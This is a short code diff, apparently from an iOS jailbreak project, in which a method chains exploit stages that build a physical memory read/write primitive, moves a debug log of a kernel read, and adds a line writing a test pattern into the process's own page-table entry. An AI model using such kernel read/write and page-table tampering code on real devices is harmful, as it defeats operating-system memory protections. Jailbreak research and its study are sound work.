@@ -149,10 +149,11 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
     if (err) return err;
     err = [self buildPhysRWPrimitive];
     if (err) return err;
-    NSLog(@"We out here! %x\n", kread32(kconstant(base)));
     err = [self cleanUpExploits];
     if (err) return err;
     
+    NSLog(@"We out here! %x\n", kread32(kconstant(base)));
+    physwrite64(kread64(pmap_self() + koffsetof(pmap, ttep)) + (7*8), 0x4141414141414141);
     
     return nil;
 }
